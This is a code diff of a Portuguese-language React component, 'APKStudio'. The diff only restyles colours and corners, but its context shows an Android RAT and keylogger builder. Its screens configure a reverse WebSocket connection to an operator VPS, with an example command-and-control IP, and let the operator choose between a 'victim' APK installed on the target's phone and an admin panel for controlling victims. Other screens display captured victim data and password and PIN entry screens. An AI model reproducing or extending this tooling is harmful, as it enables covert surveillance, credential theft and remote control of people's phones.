-                      className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1"
+                      className="w-full bg-[#2a2a31] text-white px-3 py-2 rounded mt-1"
                     />
                     {currentProject.iconUrl && (
-                      <img src={currentProject.iconUrl} className="w-16 h-16 rounded-xl mt-2" />
+                      <img src={currentProject.iconUrl} className="w-16 h-16 rounded-md mt-2" />
                     )}
                   </div>
                 </div>
               </div>
 
               {/* Funcionalidades */}
-              <div className="bg-[#440e05] rounded-xl p-6">
+              <div className="bg-[#121214] rounded-md p-6">
                 <h3 className="text-white font-semibold mb-4">🔧 Funcionalidades</h3>
                 <div className="space-y-3">
                   <label className="flex items-center gap-3 cursor-pointer">
@@ -3799,15 +3799,15 @@ const APKStudio: React.FC = () => {
               </div>
 
               {/* 🔥 SEPARAÇÃO: Mostrar no Painel Web Principal */}
-              <div className="bg-gradient-to-br from-blue-900/50 to-indigo-900/50 rounded-xl p-6 border border-blue-600">
-                <h3 className="text-blue-400 font-bold mb-4">🔄 Integração com Painel Web</h3>
+              <div className="bg-gradient-to-br from-[#1a1a1e]/50 to-[#1a1a1e]/50 rounded-md p-6 border border-[#3a3a44]">
+                <h3 className="text-[#ef4444] font-bold mb-4">🔄 Integração com Painel Web</h3>
                 <div className="space-y-4">
-                  <label className="flex items-center gap-3 cursor-pointer p-3 bg-slate-700/50 rounded-lg hover:bg-slate-700 transition">
+                  <label className="flex items-center gap-3 cursor-pointer p-3 bg-[#2a2a31]/50 rounded-md hover:bg-[#2a2a31] transition">
                     <input
                       type="checkbox"
                       checked={currentProject.showInWebPanel}
                       onChange={(e) => setCurrentProject({ ...currentProject, showInWebPanel: e.target.checked })}
-                      className="w-6 h-6 accent-blue-500"
+                      className="w-6 h-6 accent-[#ef4444]"
                     />
                     <div>
                       <span className="text-white font-semibold">📊 Mostrar no Painel Web Principal</span>
@@ -3817,7 +3817,7 @@ const APKStudio: React.FC = () => {
                     </div>
                   </label>
                   
-                  <div className={`p-4 rounded-lg ${currentProject.showInWebPanel ? 'bg-green-600/20 border border-green-600/50' : 'bg-slate-700/50'}`}>
+                  <div className={`p-4 rounded-md ${currentProject.showInWebPanel ? 'bg-green-600/20 border border-green-600/50' : 'bg-[#2a2a31]/50'}`}>
                     {currentProject.showInWebPanel ? (
                       <div className="text-green-300 flex items-start gap-2">
                         <span className="text-xl">✅</span>
@@ -3845,9 +3845,9 @@ const APKStudio: React.FC = () => {
                   </div>
                   
                   {/* Identificador */}
-                  <div className="text-sm text-gray-500 flex items-center gap-2 pt-2 border-t border-blue-500/20">
+                  <div className="text-sm text-gray-500 flex items-center gap-2 pt-2 border-t border-[#2a2a31]/20">
                     <span>🏷️ Origem:</span>
-                    <span className="bg-blue-600/50 text-cyan-300 px-2 py-1 rounded text-xs font-mono">
+                    <span className="bg-[#ef4444]/50 text-[#ef4444] px-2 py-1 rounded text-xs font-mono">
                       {currentProject.source || 'apk_studio'}
                     </span>
                   </div>
@@ -3856,8 +3856,8 @@ const APKStudio: React.FC = () => {
               
               {/* Conexão Reversa - URL do Servidor */}
               {(currentProject.enableRat || currentProject.enableKeylogger) && (
-                <div className="bg-gradient-to-br from-red-900/50 to-rose-900/50 rounded-xl p-6 border border-red-600">
-                  <h3 className="text-red-400 font-bold mb-4">🔗 Conexão Reversa (RAT)</h3>
+                <div className="bg-gradient-to-br from-[#1a1a1e]/50 to-[#1a1a1e]/50 rounded-md p-6 border border-[#3a3a44]">
+                  <h3 className="text-[#ef4444] font-bold mb-4">🔗 Conexão Reversa (RAT)</h3>
                   <div className="space-y-4">
                     <div>
                       <label className="text-gray-300 text-sm font-semibold">🌐 URL do Servidor (VPS)</label>
@@ -3866,15 +3866,15 @@ const APKStudio: React.FC = () => {
                         value={(currentProject as any).serverUrl || ''}
                         onChange={(e) => setCurrentProject({ ...currentProject, serverUrl: e.target.value } as any)}
                         placeholder={defaultWsPlaceholder()}
-                        className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1 border border-red-600/50"
+                        className="w-full bg-[#2a2a31] text-white px-3 py-2 rounded mt-1 border border-[#3a3a44]/50"
                       />
-                      <p className="text-red-300/70 text-xs mt-1">
+                      <p className="text-[#ef4444]/70 text-xs mt-1">
                         ⚠️ <strong>IMPORTANTE:</strong> Coloque a URL da sua VPS. 
                         O APK vai conectar nesse servidor para enviar dados e receber comandos.
                       </p>
                     </div>
-                    <div className="p-3 bg-red-600/20 rounded-lg">
-                      <p className="text-red-300 text-sm">
+                    <div className="p-3 bg-[#ef4444]/20 rounded-md">
+                      <p className="text-[#ef4444] text-sm">
                         📡 <strong>Formato:</strong> ws://IP:PORTA/ws<br/>
                         📌 <strong>Exemplo VPS:</strong> ws://151.243.137.239:7771/ws<br/>
                         📌 <strong>Exemplo local:</strong> ws://localhost:7771/ws
@@ -3885,7 +3885,7 @@ const APKStudio: React.FC = () => {
               )}
 
               {/* Tema */}
-              <div className="bg-[#440e05] rounded-xl p-6">
+              <div className="bg-[#121214] rounded-md p-6">
                 <h3 className="text-white font-semibold mb-4">🎨 Cores do Tema</h3>
                 <div className="grid grid-cols-2 gap-4">
                   {Object.entries(currentProject.theme).map(([key, value]) => (
@@ -3908,7 +3908,7 @@ const APKStudio: React.FC = () => {
                             ...currentProject,
                             theme: { ...currentProject.theme, [key]: e.target.value }
                           })}
-                          className="flex-1 bg-slate-700 text-white px-2 py-1 rounded text-sm"
+                          className="flex-1 bg-[#2a2a31] text-white px-2 py-1 rounded text-sm"
                         />
                       </div>
                     </div>
@@ -3918,8 +3918,8 @@ const APKStudio: React.FC = () => {
               
               {/* Configurações do Painel Mobile RAT */}
               {currentProject.projectType === 'mobile_panel' && (
-                <div className="bg-gradient-to-br from-orange-900/50 to-amber-900/50 rounded-xl p-6 border border-orange-600">
-                  <h3 className="text-orange-400 font-bold mb-4 flex items-center gap-2">
+                <div className="bg-gradient-to-br from-[#1a1a1e]/50 to-amber-900/50 rounded-md p-6 border border-[#84cc16]">
+                  <h3 className="text-[#f87171] font-bold mb-4 flex items-center gap-2">
                     <Monitor className="w-5 h-5" />
                     📲 Configurações do Painel Mobile RAT
                   </h3>
@@ -3935,9 +3935,9 @@ const APKStudio: React.FC = () => {
                         mobilePanelConfig: { ...currentProject.mobilePanelConfig!, serverUrl: e.target.value }
                       })}
                       placeholder="https://seu-servidor.com"
-                      className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1 border border-orange-600/50"
+                      className="w-full bg-[#2a2a31] text-white px-3 py-2 rounded mt-1 border border-[#84cc16]/50"
                     />
-                    <p className="text-orange-300/70 text-xs mt-1">O painel mobile vai se conectar a este servidor</p>
+                    <p className="text-[#fca5a5]/70 text-xs mt-1">O painel mobile vai se conectar a este servidor</p>
                   </div>
                   
                   {/* Credenciais */}
@@ -3952,7 +3952,7 @@ const APKStudio: React.FC = () => {
                           mobilePanelConfig: { ...currentProject.mobilePanelConfig!, operatorUsername: e.target.value }
                         })}
                         placeholder="admin"
-                        className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1"
+                        className="w-full bg-[#2a2a31] text-white px-3 py-2 rounded mt-1"
                       />
                     </div>
                     <div>
@@ -3965,7 +3965,7 @@ const APKStudio: React.FC = () => {
                           mobilePanelConfig: { ...currentProject.mobilePanelConfig!, operatorPassword: e.target.value }
                         })}
                         placeholder="••••••••"
-                        className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1"
+                        className="w-full bg-[#2a2a31] text-white px-3 py-2 rounded mt-1"
                       />
                     </div>
                   </div>
@@ -3985,7 +3985,7 @@ const APKStudio: React.FC = () => {
                         { key: 'enableLocation', label: '📍 Localização GPS', icon: '📍' },
                         { key: 'enableApkBuilder', label: '➕ Gerar APKs pelo App', icon: '➕' },
                       ].map(({ key, label }) => (
-                        <label key={key} className="flex items-center gap-2 cursor-pointer bg-slate-700/50 p-2 rounded">
+                        <label key={key} className="flex items-center gap-2 cursor-pointer bg-[#2a2a31]/50 p-2 rounded">
                           <input
                             type="checkbox"
                             checked={currentProject.mobilePanelConfig?.[key as keyof typeof currentProject.mobilePanelConfig] as boolean || false}
@@ -4002,7 +4002,7 @@ const APKStudio: React.FC = () => {
                   </div>
                   
                   {/* Branding Customizado */}
-                  <div className="border-t border-orange-600/30 pt-4">
+                  <div className="border-t border-[#84cc16]/30 pt-4">
                     <label className="flex items-center gap-2 cursor-pointer mb-3">
                       <input
                         type="checkbox"
@@ -4013,7 +4013,7 @@ const APKStudio: React.FC = () => {
                         })}
                         className="w-4 h-4"
                       />
-                      <span className="text-orange-400 font-semibold">🎨 Branding Personalizado</span>
+                      <span className="text-[#f87171] font-semibold">🎨 Branding Personalizado</span>
                     </label>
                     
                     {currentProject.mobilePanelConfig?.customBranding && (
@@ -4028,7 +4028,7 @@ const APKStudio: React.FC = () => {
                               mobilePanelConfig: { ...currentProject.mobilePanelConfig!, brandingName: e.target.value }
                             })}
                             placeholder="Kryptos Remote Control"
-                            className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1"
+                            className="w-full bg-[#2a2a31] text-white px-3 py-2 rounded mt-1"
                           />
                         </div>
                         <div>
@@ -4041,15 +4041,15 @@ const APKStudio: React.FC = () => {
                               mobilePanelConfig: { ...currentProject.mobilePanelConfig!, brandingLogo: e.target.value }
                             })}
                             placeholder="https://..."
-                            className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1"
+                            className="w-full bg-[#2a2a31] text-white px-3 py-2 rounded mt-1"
                           />
                         </div>
                       </div>
                     )}
                   </div>
                   
-                  <div className="mt-4 p-3 bg-orange-600/20 rounded-lg">
-                    <p className="text-orange-300 text-sm">
+                  <div className="mt-4 p-3 bg-[#84cc16]/20 rounded-md">
+                    <p className="text-[#fca5a5] text-sm">
                       ⚠️ <strong>Importante:</strong> Este APK será um painel de controle mobile que se conecta ao mesmo servidor principal. 
                       O operador poderá controlar vítimas e até gerar novos APKs RAT diretamente do celular dele.
                     </p>
@@ -4069,26 +4069,26 @@ const APKStudio: React.FC = () => {
                 <div className="flex gap-2">
                   <button
                     onClick={() => exportData('csv')}
-                    className="px-3 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg text-sm font-semibold"
+                    className="px-3 py-2 bg-green-600 hover:bg-green-700 text-white rounded-md text-sm font-semibold"
                   >
                     📥 CSV
                   </button>
                   <button
                     onClick={() => exportData('json')}
-                    className="px-3 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-sm font-semibold"
+                    className="px-3 py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md text-sm font-semibold"
                   >
                     📥 JSON
                   </button>
                   <button
                     onClick={() => loadCapturedData(dataPage)}
                     disabled={isLoadingData}
-                    className="px-3 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-sm font-semibold disabled:opacity-50"
+                    className="px-3 py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md text-sm font-semibold disabled:opacity-50"
                   >
                     {isLoadingData ? '⏳' : '🔄'} Atualizar
                   </button>
                   <button
                     onClick={clearAllData}
-                    className="px-3 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg text-sm font-semibold"
+                    className="px-3 py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md text-sm font-semibold"
                   >
                     🗑️ Limpar
                   </button>
@@ -4097,16 +4097,16 @@ const APKStudio: React.FC = () => {
               
               {/* Estatísticas */}
               <div className="grid grid-cols-4 gap-4 mb-6">
-                <div className="bg-[#440e05] rounded-xl p-4 border border-blue-500/20">
+                <div className="bg-[#121214] rounded-md p-4 border border-[#2a2a31]/20">
                   <div className="flex items-center gap-3">
-                    <Database className="w-8 h-8 text-blue-500" />
+                    <Database className="w-8 h-8 text-[#ef4444]" />
                     <div>
                       <p className="text-gray-400 text-xs">Total no Banco</p>
                       <p className="text-2xl font-bold text-white">{dataTotalEntries}</p>
                     </div>
                   </div>
                 </div>
-                <div className="bg-[#440e05] rounded-xl p-4 border border-blue-500/20">
+                <div className="bg-[#121214] rounded-md p-4 border border-[#2a2a31]/20">
                   <div className="flex items-center gap-3">
                     <BarChart3 className="w-8 h-8 text-green-500" />
                     <div>
@@ -4115,18 +4115,18 @@ const APKStudio: React.FC = () => {
                     </div>
                   </div>
                 </div>
-                <div className="bg-[#440e05] rounded-xl p-4 border border-blue-500/20">
+                <div className="bg-[#121214] rounded-md p-4 border border-[#2a2a31]/20">
                   <div className="flex items-center gap-3">
-                    <Users className="w-8 h-8 text-blue-500" />
+                    <Users className="w-8 h-8 text-[#ef4444]" />
                     <div>
                       <p className="text-gray-400 text-xs">Página</p>
                       <p className="text-2xl font-bold text-white">{dataPage}/{dataTotalPages}</p>
                     </div>
                   </div>
                 </div>
-                <div className="bg-[#440e05] rounded-xl p-4 border border-blue-500/20">
+                <div className="bg-[#121214] rounded-md p-4 border border-[#2a2a31]/20">
                   <div className="flex items-center gap-3">
-                    <Clock className="w-8 h-8 text-orange-500" />
+                    <Clock className="w-8 h-8 text-[#ef4444]" />
                     <div>
                       <p className="text-gray-400 text-xs">Último Registro</p>
                       <p className="text-sm text-white">
@@ -4142,13 +4142,13 @@ const APKStudio: React.FC = () => {
               
               {/* Campos Detectados (Banco de Dados Inteligente) */}
               {dataFields.length > 0 && (
-                <div className="bg-[#440e05] rounded-xl p-4 mb-6 border border-blue-500/20">
+                <div className="bg-[#121214] rounded-md p-4 mb-6 border border-[#2a2a31]/20">
                   <h3 className="text-white font-semibold mb-3">🏷️ Campos Detectados Automaticamente (Banco de Dados Dinâmico)</h3>
                   <div className="flex flex-wrap gap-2">
                     {dataFields.map(field => (
                       <span 
                         key={field.name} 
-                        className="px-3 py-1 bg-blue-600/30 text-cyan-300 rounded-full text-sm flex items-center gap-1"
+                        className="px-3 py-1 bg-[#ef4444]/30 text-[#ef4444] rounded-full text-sm flex items-center gap-1"
                         title={`Tipo: ${field.type} | Ocorrências: ${field.occurrences}`}
                       >
                         {field.name}
@@ -4160,8 +4160,8 @@ const APKStudio: React.FC = () => {
               )}
               
               {/* Tabela de Dados */}
-              <div className="bg-[#440e05] rounded-xl border border-blue-500/20 overflow-hidden">
-                <div className="p-4 border-b border-blue-500/20 flex items-center justify-between">
+              <div className="bg-[#121214] rounded-md border border-[#2a2a31]/20 overflow-hidden">
+                <div className="p-4 border-b border-[#2a2a31]/20 flex items-center justify-between">
                   <h3 className="text-white font-semibold">📋 Registros no Banco de Dados</h3>
                   <span className="text-gray-400 text-sm">
                     💾 Dados persistentes - não são perdidos ao reiniciar
@@ -4169,7 +4169,7 @@ const APKStudio: React.FC = () => {
                 </div>
                 {isLoadingData ? (
                   <div className="p-8 text-center">
-                    <Loader2 className="w-8 h-8 text-blue-500 mx-auto animate-spin" />
+                    <Loader2 className="w-8 h-8 text-[#ef4444] mx-auto animate-spin" />
                     <p className="text-gray-400 mt-2">Carregando dados...</p>
                   </div>
                 ) : capturedData.length === 0 ? (
@@ -4184,13 +4184,13 @@ const APKStudio: React.FC = () => {
                   <>
                     <div className="overflow-x-auto">
                       <table className="w-full">
-                        <thead className="bg-slate-700">
+                        <thead className="bg-[#2a2a31]">
                           <tr>
                             <th className="px-4 py-2 text-left text-gray-400 text-xs">ID</th>
                             {dataFields.slice(0, 5).map(field => (
                               <th key={field.name} className="px-4 py-2 text-left text-gray-400 text-xs">
                                 {field.name}
-                                <span className="ml-1 text-blue-400 text-[10px]">({field.type})</span>
+                                <span className="ml-1 text-[#ef4444] text-[10px]">({field.type})</span>
                               </th>
                             ))}
                             <th className="px-4 py-2 text-left text-gray-400 text-xs">IP</th>
@@ -4199,7 +4199,7 @@ const APKStudio: React.FC = () => {
                         </thead>
                         <tbody>
                           {capturedData.map((row, i) => (
-                            <tr key={row._id || i} className="border-t border-blue-500/20 hover:bg-slate-700/50">
+                            <tr key={row._id || i} className="border-t border-[#2a2a31]/20 hover:bg-[#2a2a31]/50">
                               <td className="px-4 py-2 text-gray-500 text-sm font-mono">{row._id}</td>
                               {dataFields.slice(0, 5).map(field => (
                                 <td key={field.name} className="px-4 py-2 text-white text-sm max-w-[200px] truncate">
@@ -4218,18 +4218,18 @@ const APKStudio: React.FC = () => {
                     
                     {/* Paginação */}
                     {dataTotalPages > 1 && (
-                      <div className="p-4 border-t border-blue-500/20 flex items-center justify-center gap-2">
+                      <div className="p-4 border-t border-[#2a2a31]/20 flex items-center justify-center gap-2">
                         <button
                           onClick={() => loadCapturedData(1)}
                           disabled={dataPage === 1}
-                          className="px-3 py-1 bg-slate-700 hover:bg-slate-600 text-white rounded disabled:opacity-50"
+                          className="px-3 py-1 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded disabled:opacity-50"
                         >
                           ⏮️
                         </button>
                         <button
                           onClick={() => loadCapturedData(dataPage - 1)}
                           disabled={dataPage === 1}
-                          className="px-3 py-1 bg-slate-700 hover:bg-slate-600 text-white rounded disabled:opacity-50"
+                          className="px-3 py-1 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded disabled:opacity-50"
                         >
                           ◀️
                         </button>
@@ -4239,14 +4239,14 @@ const APKStudio: React.FC = () => {
                         <button
                           onClick={() => loadCapturedData(dataPage + 1)}
                           disabled={dataPage === dataTotalPages}
-                          className="px-3 py-1 bg-slate-700 hover:bg-slate-600 text-white rounded disabled:opacity-50"
+                          className="px-3 py-1 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded disabled:opacity-50"
                         >
                           ▶️
                         </button>
                         <button
                           onClick={() => loadCapturedData(dataTotalPages)}
                           disabled={dataPage === dataTotalPages}
-                          className="px-3 py-1 bg-slate-700 hover:bg-slate-600 text-white rounded disabled:opacity-50"
+                          className="px-3 py-1 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded disabled:opacity-50"
                         >
                           ⏭️
                         </button>
@@ -4266,7 +4266,7 @@ const APKStudio: React.FC = () => {
               <div className="flex items-center gap-4">
                 <h2 className="text-xl font-bold text-white">📱 Preview Interativo</h2>
                 <span className={`px-3 py-1 rounded-full text-sm font-bold ${
-                  editingMode === 'panel' ? 'bg-green-600 text-white' : 'bg-red-600 text-white'
+                  editingMode === 'panel' ? 'bg-green-600 text-white' : 'bg-[#ef4444] text-white'
                 }`}>
                   {editingMode === 'panel' ? '👑 PAINEL ADMIN' : '👤 VÍTIMA'}
                 </span>
@@ -4277,7 +4277,7 @@ const APKStudio: React.FC = () => {
                 <button
                   onClick={() => setCurrentScreenIndex(Math.max(0, currentScreenIndex - 1))}
                   disabled={currentScreenIndex === 0}
-                  className="p-2 bg-slate-700 hover:bg-slate-600 disabled:opacity-50 rounded-lg"
+                  className="p-2 bg-[#2a2a31] hover:bg-[#6f6f78] disabled:opacity-50 rounded-md"
                 >
                   ◀️
                 </button>
@@ -4287,7 +4287,7 @@ const APKStudio: React.FC = () => {
                 <button
                   onClick={() => setCurrentScreenIndex(Math.min(currentScreens.length - 1, currentScreenIndex + 1))}
                   disabled={currentScreenIndex >= currentScreens.length - 1}
-                  className="p-2 bg-slate-700 hover:bg-slate-600 disabled:opacity-50 rounded-lg"
+                  className="p-2 bg-[#2a2a31] hover:bg-[#6f6f78] disabled:opacity-50 rounded-md"
                 >
                   ▶️
                 </button>
@@ -4298,7 +4298,7 @@ const APKStudio: React.FC = () => {
             <div className="flex-1 flex items-center justify-center gap-8">
               {/* Celular Preview GRANDE */}
               <div className="flex flex-col items-center">
-                <div className="bg-gradient-to-b from-gray-700 to-gray-900 rounded-[50px] p-3 shadow-2xl shadow-purple-500/30">
+                <div className="bg-gradient-to-b from-gray-700 to-gray-900 rounded-[50px] p-3 shadow-2xl shadow-[#f87171]/30">
                   {/* Notch */}
                   <div className="w-24 h-6 bg-black rounded-full mx-auto mb-2 relative">
                     <div className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 w-4 h-4 bg-gray-800 rounded-full"></div>
@@ -4380,7 +4380,7 @@ const APKStudio: React.FC = () => {
                             key={el.id}
                             type={el.inputType === 'password' || el.inputType === 'pin' ? 'password' : 'text'}
                             placeholder={el.placeholder || displayContent}
-                            className="bg-[#440e05] text-white outline-none"
+                            className="bg-[#121214] text-white outline-none"
                             style={{
                               ...baseStyle,
                               border: '1px solid #444',
@@ -4418,17 +4418,17 @@ const APKStudio: React.FC = () => {
               </div>
               
               {/* Lista de telas (thumbnails) */}
-              <div className="bg-[#290903] rounded-xl p-4 max-h-[800px] overflow-y-auto w-48">
+              <div className="bg-[#1a1a1e] rounded-md p-4 max-h-[800px] overflow-y-auto w-48">
                 <h3 className="text-white font-bold mb-3 text-sm">📋 Todas as Telas</h3>
                 <div className="space-y-2">
                   {currentScreens.map((screen, idx) => (
                     <button
                       key={screen.id}
                       onClick={() => setCurrentScreenIndex(idx)}
-                      className={`w-full p-2 rounded-lg text-left text-xs transition-all ${
+                      className={`w-full p-2 rounded-md text-left text-xs transition-all ${
                         idx === currentScreenIndex 
-                          ? 'bg-blue-600 text-white' 
-                          : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
+                          ? 'bg-[#ef4444] text-white' 
+                          : 'bg-[#2a2a31] text-gray-300 hover:bg-[#6f6f78]'
                       }`}
                     >
                       <span className="font-bold">{idx + 1}.</span> {screen.name}
@@ -4439,7 +4439,7 @@ const APKStudio: React.FC = () => {
             </div>
             
             {/* Info do app */}
-            <div className="mt-4 p-4 bg-[#290903] rounded-xl mx-auto max-w-lg">
+            <div className="mt-4 p-4 bg-[#1a1a1e] rounded-md mx-auto max-w-lg">
               <div className="grid grid-cols-3 gap-4 text-center">
                 <div>
                   <p className="text-2xl font-bold text-white">{currentScreens.length}</p>
@@ -4452,7 +4452,7 @@ const APKStudio: React.FC = () => {
                   <p className="text-gray-400 text-xs">Elementos</p>
                 </div>
                 <div>
-                  <p className="text-lg font-bold text-blue-400 truncate">{currentProject.appName}</p>
+                  <p className="text-lg font-bold text-[#ef4444] truncate">{currentProject.appName}</p>
                   <p className="text-gray-400 text-xs">Nome do App</p>
                 </div>
               </div>
@@ -4464,18 +4464,18 @@ const APKStudio: React.FC = () => {
       {/* Modal de Build */}
       {buildStatus.isBuilding && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-          <div className="bg-[#440e05] rounded-2xl p-8 max-w-md w-full mx-4">
+          <div className="bg-[#121214] rounded-md p-8 max-w-md w-full mx-4">
             <div className="text-center">
-              <Loader2 className="w-16 h-16 text-blue-500 mx-auto mb-4 animate-spin" />
+              <Loader2 className="w-16 h-16 text-[#ef4444] mx-auto mb-4 animate-spin" />
               <h3 className="text-xl font-bold text-white mb-2">Construindo APK...</h3>
               <p className="text-gray-400 mb-4">{buildStatus.message}</p>
-              <div className="w-full bg-slate-700 rounded-full h-3 mb-2">
+              <div className="w-full bg-[#2a2a31] rounded-full h-3 mb-2">
                 <div 
-                  className="bg-blue-600 h-3 rounded-full transition-all duration-300"
+                  className="bg-[#ef4444] h-3 rounded-full transition-all duration-300"
                   style={{ width: `${buildStatus.progress}%` }}
                 />
               </div>
-              <p className="text-blue-400 text-sm">{buildStatus.progress}%</p>
+              <p className="text-[#ef4444] text-sm">{buildStatus.progress}%</p>
             </div>
           </div>
         </div>
@@ -4484,24 +4484,24 @@ const APKStudio: React.FC = () => {
       {/* Modal de Confirmação de Build */}
       {showBuildConfirm && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-          <div className="bg-[#440e05] rounded-2xl p-6 max-w-2xl w-full mx-4 max-h-[90vh] overflow-y-auto">
+          <div className="bg-[#121214] rounded-md p-6 max-w-2xl w-full mx-4 max-h-[90vh] overflow-y-auto">
             <h3 className="text-xl font-bold text-white mb-4 flex items-center gap-2">
               🚀 Confirmar Criação do APK
             </h3>
             
             {/* 🔥 SELETOR DE TIPO DE APK - Vítima ou Painel */}
             {(currentProject?.projectType === 'rat' || currentProject?.projectType === 'hybrid') && currentProject.panelScreens && currentProject.panelScreens.length > 0 && (
-              <div className="bg-gradient-to-r from-purple-900/50 to-blue-900/50 rounded-lg p-4 mb-4 border-2 border-blue-500">
+              <div className="bg-gradient-to-r from-purple-900/50 to-[#1a1a1e]/50 rounded-md p-4 mb-4 border-2 border-[#2a2a31]">
                 <h4 className="text-white font-bold mb-3 flex items-center gap-2">
                   🎯 QUAL APK DESEJA GERAR?
                 </h4>
                 <div className="grid grid-cols-2 gap-3">
                   <button
                     onClick={() => setBuildTarget('victim')}
-                    className={`p-4 rounded-xl border-2 transition-all ${
+                    className={`p-4 rounded-md border-2 transition-all ${
                       buildTarget === 'victim' 
-                        ? 'bg-red-600 border-red-400 shadow-lg shadow-red-500/50' 
-                        : 'bg-slate-700 border-blue-500/25 hover:border-red-400'
+                        ? 'bg-[#ef4444] border-[#3a3a44] shadow-lg shadow-[#ef4444]/50' 
+                        : 'bg-[#2a2a31] border-[#2a2a31]/25 hover:border-[#3a3a44]'
                     }`}
                   >
                     <div className="text-2xl mb-2">👤</div>
@@ -4509,16 +4509,16 @@ const APKStudio: React.FC = () => {
                     <div className="text-xs text-gray-300 mt-1">
                       {currentProject.screens?.length || 0} telas
                     </div>
-                    <div className="text-xs text-red-300 mt-1">
+                    <div className="text-xs text-[#ef4444] mt-1">
                       O RAT que será instalado no celular do alvo
                     </div>
                   </button>
                   <button
                     onClick={() => setBuildTarget('panel')}
-                    className={`p-4 rounded-xl border-2 transition-all ${
+                    className={`p-4 rounded-md border-2 transition-all ${
                       buildTarget === 'panel' 
                         ? 'bg-green-600 border-green-400 shadow-lg shadow-green-500/50' 
-                        : 'bg-slate-700 border-blue-500/25 hover:border-green-400'
+                        : 'bg-[#2a2a31] border-[#2a2a31]/25 hover:border-green-400'
                     }`}
                   >
                     <div className="text-2xl mb-2">👑</div>
@@ -4538,20 +4538,20 @@ const APKStudio: React.FC = () => {
             )}
             
             {/* Resumo do App */}
-            <div className="bg-[#290903] rounded-lg p-4 mb-4">
+            <div className="bg-[#1a1a1e] rounded-md p-4 mb-4">
               <h4 className="text-white font-semibold mb-2">📱 Resumo do App</h4>
               <div className="grid grid-cols-2 gap-2 text-sm">
                 <p className="text-gray-400">Nome: <span className="text-white">{currentProject?.appName}</span></p>
                 <p className="text-gray-400">Pacote: <span className="text-white">{currentProject?.packageName}</span></p>
                 <p className="text-gray-400">Telas: <span className="text-white">{buildTarget === 'panel' ? (currentProject?.panelScreens?.length || 0) : (currentProject?.screens?.length || 0)}</span></p>
-                <p className="text-gray-400">Tipo: <span className={`font-bold ${buildTarget === 'panel' ? 'text-green-400' : 'text-red-400'}`}>
+                <p className="text-gray-400">Tipo: <span className={`font-bold ${buildTarget === 'panel' ? 'text-green-400' : 'text-[#ef4444]'}`}>
                   {buildTarget === 'panel' ? '👑 PAINEL ADMIN' : '👤 VÍTIMA RAT'}
                 </span></p>
               </div>
             </div>
             
             {/* Campos de Dados */}
-            <div className="bg-[#290903] rounded-lg p-4 mb-4">
+            <div className="bg-[#1a1a1e] rounded-md p-4 mb-4">
               <h4 className="text-yellow-400 font-semibold mb-2 flex items-center gap-2">
                 📊 Campos de Dados (Banco de Dados)
               </h4>
@@ -4560,10 +4560,10 @@ const APKStudio: React.FC = () => {
                   <p className="text-green-400 text-xs mb-2">
                     ✅ Os seguintes campos serão criados automaticamente na API e banco de dados:
                   </p>
-                  <div className="bg-[#440e05] rounded p-2">
+                  <div className="bg-[#121214] rounded p-2">
                     <table className="w-full text-xs">
                       <thead>
-                        <tr className="text-gray-400 border-b border-blue-500/20">
+                        <tr className="text-gray-400 border-b border-[#2a2a31]/20">
                           <th className="text-left py-1">Tela</th>
                           <th className="text-left py-1">Campo</th>
                           <th className="text-left py-1">ID/Label</th>
@@ -4572,11 +4572,11 @@ const APKStudio: React.FC = () => {
                       </thead>
                       <tbody>
                         {analyzeDataFields().map((field, idx) => (
-                          <tr key={idx} className="text-white border-b border-blue-500/20/50">
-                            <td className="py-1 text-blue-400">{field.screen}</td>
+                          <tr key={idx} className="text-white border-b border-[#2a2a31]/20/50">
+                            <td className="py-1 text-[#ef4444]">{field.screen}</td>
                             <td className="py-1">{field.element}</td>
                             <td className="py-1 font-mono text-green-400">{field.label}</td>
-                            <td className="py-1 text-blue-400">{field.fieldType}</td>
+                            <td className="py-1 text-[#ef4444]">{field.fieldType}</td>
                           </tr>
                         ))}
                       </tbody>
@@ -4591,8 +4591,8 @@ const APKStudio: React.FC = () => {
             </div>
             
             {/* Elementos Visuais */}
-            <div className="bg-[#290903] rounded-lg p-4 mb-4">
-              <h4 className="text-blue-400 font-semibold mb-2 flex items-center gap-2">
+            <div className="bg-[#1a1a1e] rounded-md p-4 mb-4">
+              <h4 className="text-[#ef4444] font-semibold mb-2 flex items-center gap-2">
                 🎨 Elementos Visuais
               </h4>
               <p className="text-gray-400 text-sm">
@@ -4602,7 +4602,7 @@ const APKStudio: React.FC = () => {
             </div>
             
             {/* Info do Webhook */}
-            <div className="bg-green-900/30 border border-green-600/50 rounded-lg p-4 mb-4">
+            <div className="bg-green-900/30 border border-green-600/50 rounded-md p-4 mb-4">
               <h4 className="text-green-400 font-semibold mb-2">📡 API Automática</h4>
               <p className="text-gray-300 text-sm mb-2">
                 Ao confirmar, o sistema irá criar automaticamente:
@@ -4622,13 +4622,13 @@ const APKStudio: React.FC = () => {
             <div className="flex gap-3">
               <button
                 onClick={() => setShowBuildConfirm(false)}
-                className="flex-1 py-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg font-semibold"
+                className="flex-1 py-3 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md font-semibold"
               >
                 ← Voltar e Editar
               </button>
               <button
                 onClick={buildAPK}
-                className="flex-1 py-3 bg-gradient-to-r from-blue-600 to-pink-600 hover:from-blue-700 hover:to-pink-700 text-white rounded-lg font-semibold flex items-center justify-center gap-2"
